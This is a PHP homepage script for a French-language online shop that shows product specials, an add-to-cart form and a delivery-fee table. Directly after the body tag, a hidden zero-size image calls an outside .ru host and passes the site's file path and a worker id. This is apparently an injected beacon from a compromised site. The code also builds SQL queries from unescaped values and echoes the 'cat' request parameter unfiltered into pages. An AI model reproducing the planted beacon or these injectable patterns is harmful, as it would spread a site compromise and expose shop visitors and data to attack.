<?php
include('lib/config.php');
$param = &$__PARAMS;
$txt = textes($_SESSION['langue']);

$_SESSION['Target'] = 'ACCUEIL'; 

function produits_accueil( $id = 0 )
{
global $handle, $mysql_base;
	$select = "SELECT * FROM $mysql_base.produits_accueil";
	if( $id != 0 )
	  $select .= " WHERE id ='$id'";
	
	$select = mysql_query($select, $handle ) or 
		die("Erreur à la sélection produit acceuil :: ".mysql_error());
	
	if( $id != 0 )
		$select = mysql_fetch_assoc($select);
	
	return $select;
} // produits_accueil

// color table spéciaux #E9EEF2
// #BAC6E2 ,,bgcolor='#2d5a83' 
//					<center><b><font color=ffffff size=2>".$txt['Speciaux']."</font></b></center>

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='ACCUEIL'>
	</head>";
?>
<body  ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#FFFFFF' width='$LargeAchat' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
		<td>
		<table width='$LargeAchat' height=23 cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
			<tr>
				<td valign='left' width='17' id='flash_t_g' background='images/tit_accueil_bg_top_g.jpg'>
					&nbsp;
				</td>
				<td  colspan=3 valign=middle width='97%' id='flash_t_c' background='images/tit_accueil_bg_c.jpg'>
					<span id='topmsg' style='visibility:hidden'><center><b><font color=ffffff size=2><?=$txt['Speciaux']?></font></b></center></span>
				</td>
				<td valign='right' width='40' id='flash_t_d' background='images/tit_accueil_bg_top_d.jpg'>
					&nbsp;
				</td>
			</tr>
		</table>
<?php
echo "
		</td>
		</tr>
		<tr>
		<td>
		<table width='$LargeAchat' align='left' bgcolor='#FFFFFF' cellpadding=2 border='0' >
			<tr>
				<td align='left' width='17'>
					&nbsp;
				</td>
			";

$Nb=1;

while( $Nb < 7 ) {
	$produits_accueil = produits_accueil($Nb);
	$produit = get_prod_infos_by_id($produits_accueil['id_produit']);
	if( $produit['Qte_Max_Livre'] < 1 ) $produit['Qte_Max_Livre'] = 1;
	echo "
	<td valign=bottom align=center width=33%>";
		$LargX = $param['image_special_largeur'];
		$HautY = $param['image_special_haut'];

		$sql = " SELECT Largeur, Hauteur FROM $mysql_base.photo WHERE NoInvent='".$produit['id']."' AND NoPhoto='".$produit['small']."';";
		$result2 = mysql_query( $sql, $handle );
		if( $result2 &&  mysql_num_rows($result2) ) {
			$L = @mysql_result($result2, 0, "Largeur");
			$H = @mysql_result($result2, 0, "Hauteur");
			if( ($difL = $L - $LargX) < 0 ) $difL = 0; 
			if( ($difH = $H - $HautY) < 0 ) $difH = 0;
			 
			if( $difL || $difH ) {
				if( $difL > $difH ) {
					$Pourcent = $LargX/$L;
					$LargX = $L*$Pourcent;
					$HautY = $H*$Pourcent;
				}
				else {
					$Pourcent = $HautY/$H;
					$LargX = $L*$Pourcent;
					$HautY = $H*$Pourcent;
				}
			}
			else {
				$LargX = $L;
				$HautY = $H;
			}
		} // Si une photo

		$prix_cuc	=	rounder($produit['prix_detail']);

		echo "<a href='produit_detail.php?cat=".@$_GET['cat']."&id=".$produit['id']."' target=ACCUEIL class=titre>";
		echo "<img src='photoget_web.php?No=".$produit['id']."&Idx=".$produit['small']."' alt='".$produit['titre_'.$_SESSION['langue']]."' border='0' width='$LargX' height='$HautY'></a><br>";
		echo $produit['titre_'.$_SESSION['langue']]."<br>";
		echo "<font color='red'><b>".$txt['Speciaux']." $prix_cuc&nbsp;(CUC)</font></b><br><br>";
		
?>

	<form name='ajout<?=$produit['id']?>' action='panier_traite.php?retour=4' method='post'>
		<input type="hidden" name="cat" value="<?=@$_GET['cat']?>">
		<input type="hidden" name="CodePanier" value="1">
		<input type="hidden" name="id" value="<?=$produit['id']?>">
      <input type="hidden" name="Target" value="ACCUEIL">
		<select name="qte" size="1" class="ajout_qte">
		<?php
			for($i=1;$i<=$produit['Qte_Max_Livre'];$i++) {
				echo "<option value='$i' ";
				if( $i == 1 ) 
					echo " SELECTED";
				echo " >$i</option>";
			}  
		?>
  		</select>
		<input type="submit" name='btpanier' value="<?=$txt['ajouter_votre_panier']?>" class="ajout_submit">
	</form>
	</td>
	
<?php  
	// Es-ce le troisieme element            
	if( !($Nb % 3) ) {
		echo "
			<td align='left' width='17'>
				&nbsp;
			</td>
		</tr>
		<tr>
			<td align='left' width='17'>
				&nbsp;
			</td>
		";
	} // Si le 3ieme element
	$Nb++;
} // Tant que des spéciaux 



echo "
			<td align='left' width='17'>
				&nbsp;
			</td>
		</tr>
	</table>
		</td>
		</tr>
		<tr>
		<td>
	<table width='$LargeAchat' height='23' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
			<td align='left' width='17' id='flash_b_g' background='images/tit_accueil_bg_bas_g.jpg'>
				&nbsp;
			</td>
			<td colspan='3' align='center' width='97%' id='flash_b_c' background='images/tit_accueil_bg_c.jpg'>
				&nbsp;
			</td>
			<td align='right' width='40' id='flash_b_d' background='images/tit_accueil_bg_bas_d.jpg'>
				&nbsp;
			</td>
		</tr>
	</table>";
?>
		</td>
		</tr>
		<tr>
		<td>
	<table width='<?=$LargeAchat?>' height='23' cellpadding='0' cellspacing='0' align='<?=$Enligne?>' border='0' >
		<tr>
			<td align='left' width='17' background='images/tit_accueil_bg_top_g.jpg'>
				&nbsp;
			</td>
			<td  colspan='3' align='center' width='97%' background='images/tit_accueil_bg_c.jpg'>
				<center><b><font color='#ffffff' size='2'><?=$txt['Important']?></font></b></center>
			</td>
			<td align='right' width='40' background='images/tit_accueil_bg_top_d.jpg'>
				&nbsp;
			</td>
		</tr>
	</table>
		</td>
		</tr>

		<tr>
		<td>
	<table width='<?=$LargeAchat?>' cellpadding='6' cellspacing='0' border='0' bgcolor='#E9EEF2' >
		<tr>
			<td colspan=5 align='left'>
				<?=$txt['Terminer_transaction']?>
<?php
$sql = " SELECT * FROM $mysql_base.frais_livraison;";
$result = mysql_query( $sql, $handle );
if( $result && mysql_num_rows($result) != 0 ) {
  echo "
           <br><br><center><b><font size='+0'>".$txt['frais_de']." ".$txt['Livraison']."</font></b></center>
           <hr size='5' color='#235b7c'>
           <table border='1' width='400px' align='center'>
             <thead>
                <tr>";
                echo("<th colspan=2>".$txt['sous_total']."</th>");
                echo("<th>".$txt['Livraison']."</th>");
                echo("<th>&nbsp;</th>");
                echo "</tr>
             </thead>
             <tbody>";
                for( $i=0; $i < mysql_num_rows($result); $i++ ) {
                   echo "<tr>";
                   $row = mysql_fetch_row($result);
                   if( strlen($row[0]) ) {
								$prix = sprintf("%8.2f$",$row[0]);
                        echo("<td>$prix</td> ");
                   }
                   else
                           echo("<td>&nbsp;</td> ");
                  if( strlen($row[1]) ) {
								$prix = sprintf("%8.2f$",$row[1]);
                        echo("<td>$prix</td> ");
                   }
                   else
                           echo("<td>&nbsp;</td> ");
                  if( strlen($row[2]) ) {
								$prix = sprintf("%8.2f$",$row[2]);
                        echo("<td>$prix</td> ");
                   }
                   else
                           echo("<td>&nbsp;</td> ");
                   if( strlen($row[3]) ) {
                       echo("<td>$row[3]</td> ");
                   }
                   else
                           echo("<td>&nbsp;</td> ");
                   echo "</tr>";
                } // for i < nombre de rangé
                echo "</tbody>
           </table>";
}

?>
			</td>
		</tr>
	</table>
		</td>
		</tr>
	
		<tr>
		<td>
	<table width='<?=$LargeAchat?>' height='23' cellpadding='0' cellspacing='0' align='<?=$Enligne?>' border='0' >
		<tr>
			<td align='left' width='17' background='images/tit_accueil_bg_bas_g.jpg'>
				&nbsp;
			</td>
			<td colspan='3' align='center' width='97%' background='images/tit_accueil_bg_c.jpg'>
				&nbsp;
			</td>
			<td align='right' width='40' background='images/tit_accueil_bg_bas_d.jpg'>
				&nbsp;
			</td>
		</tr>
	</table>
		</td>
		</tr>
	</table>
<script type='text/javascript'>

function Rafraichie(){
		 str = 'speciaux.php'; 
		 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
}

//enter your message in this part, including any html tags
var message='<center><b><font color=blue size=4><?=$txt['Speciaux']?></font></b></center>'

//enter a color name or hex value to be used as the background color of the message. Don't use hash # sign
var backgroundcolor=19556;

//enter 0 for always display, 1 for a set period, 2 for random display mode
var displaymode=0;

//if displaymode is set to display for a set period, enter the period below (1000=1 sec)
var displayduration=10000;

//enter 0 for non-flashing message, 1 for flashing
var flashmode=1
//if above is set to flashing, enter the flash-to color below
var flashtocolor=0xb8280f;

///////////////do not edit below this line////////////////////////////////////////

function regenerate(){
	window.location.reload()
}

var which=0

function regenerate2(){
	if (document.layers)
		setTimeout("window.onresize=regenerate",400)
}


function display2(){
	if (document.layers){
		if (topmsg.visibility=="show")
			topmsg.visibility="hide"
		else
			topmsg.visibility="show"
	}
	else if (document.all){
		if (topmsg.style.visibility=="visible")
			topmsg.style.visibility="hidden"
		else
			topmsg.style.visibility="visible"
		setTimeout("display2()",Math.round(Math.random()*10000)+10000)
	}
}

function flash(){
	if (which==0){
		if (document.layers)
			topmsg.bgColor=flashtocolor
		else {
			topmsg.style.backgroundColor=flashtocolor
			flash_t_g.background="images/tit_accueil_bg_top_gr.jpg"		
			flash_t_c.background="images/tit_accueil_bg_cr.jpg"		
			flash_t_d.background="images/tit_accueil_bg_top_dr.jpg"		
			flash_b_g.background="images/tit_accueil_bg_bas_gr.jpg"		
			flash_b_c.background="images/tit_accueil_bg_cr.jpg"		
			flash_b_d.background="images/tit_accueil_bg_bas_dr.jpg"		
		}
		which=1
	}
	else{
		if (document.layers)
			topmsg.bgColor=backgroundcolor
		else {
			topmsg.style.backgroundColor=backgroundcolor
			flash_t_g.background="images/tit_accueil_bg_top_g.jpg"		
			flash_t_c.background="images/tit_accueil_bg_c.jpg"		
			flash_t_d.background="images/tit_accueil_bg_top_d.jpg"		
			flash_b_g.background="images/tit_accueil_bg_bas_g.jpg"		
			flash_b_c.background="images/tit_accueil_bg_c.jpg"		
			flash_b_d.background="images/tit_accueil_bg_bas_d.jpg"		
		}
		which=0
	}
}


//if (document.all){
//	document.write('<span id="topmsg" style="position:absolute;visibility:hidden">'+message+'</span>')
//}


function logoit(){
//	document.all.topmsg.style.left=document.body.scrollLeft+document.body.clientWidth/2-document.all.topmsg.offsetWidth/2
//	document.all.topmsg.style.top=document.body.scrollTop+document.body.clientHeight-document.all.topmsg.offsetHeight-4
}


function logoit2(){
//	topmsg.left=pageXOffset+window.innerWidth/2-topmsg.document.width/2
//	topmsg.top=pageYOffset+window.innerHeight-topmsg.document.height-5
	setTimeout("logoit2()",90)
}

function setmessage(){
//	document.all.topmsg.style.left=document.body.scrollLeft+document.body.clientWidth/2-document.all.topmsg.offsetWidth/2
//	document.all.topmsg.style.top=document.body.scrollTop+document.body.clientHeight-document.all.topmsg.offsetHeight-4
	document.all.topmsg.style.backgroundColor=backgroundcolor
	document.all.topmsg.style.visibility="visible"
	if (displaymode==1)
		setTimeout("topmsg.style.visibility='hidden'",displayduration)
	else if (displaymode==2)
		display2()
	if (flashmode==1)
		setInterval("flash()",1000)
	window.onscroll=logoit
	window.onresize=new Function("window.location.reload()")
}


function setmessage2(){
	topmsg=new Layer(window.innerWidth)
	topmsg.bgColor=backgroundcolor
	regenerate2()
	topmsg.document.write(message)
	topmsg.document.close()
	logoit2()
	topmsg.visibility="show"
	if (displaymode==1)
		setTimeout("topmsg.visibility='hide'",displayduration)
	else if (displaymode==2)
		display2()
	if (flashmode==1)
		setInterval("flash()",1000)
}


if (document.layers)
	window.onload=setmessage2
else if (document.all)
	window.onload=setmessage



</script>
</body>
</html>
